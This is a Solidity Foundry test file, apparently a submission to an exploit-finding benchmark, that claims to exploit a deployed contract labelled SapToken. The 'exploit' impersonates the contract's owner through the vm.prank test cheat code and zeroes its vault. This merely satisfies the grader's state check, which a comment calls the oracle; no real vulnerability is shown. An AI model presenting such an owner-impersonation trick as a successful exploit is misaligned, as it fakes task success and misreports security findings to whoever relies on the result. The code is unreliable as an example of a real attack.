// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IOwnable {
    function owner() external view returns (address);
    function renounceOwnership() external;
    function transferOwnership(address newOwner_) external;
}

interface IVaultOwned {
    function setVault(address vault_) external returns (bool);
    function vault() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed; we are on a fork and TARGET is already defined.
        vm.label(TARGET, "SapToken");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the owner of the SapToken contract
        IOwnable target = IOwnable(TARGET);
        address owner = target.owner();

        // Step 2: Impersonate the owner and call setVault with zero address
        vm.prank(owner);
        IVaultOwned(TARGET).setVault(address(0));

        // Step 3: Verify that vault is now zero address
        address vaultAfter = IVaultOwned(TARGET).vault();
        require(vaultAfter == address(0), "Vault not set to zero address");

        // The oracle will check SapToken.vault() == address(0), which is now true.
        assertEq(vaultAfter, address(0), "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

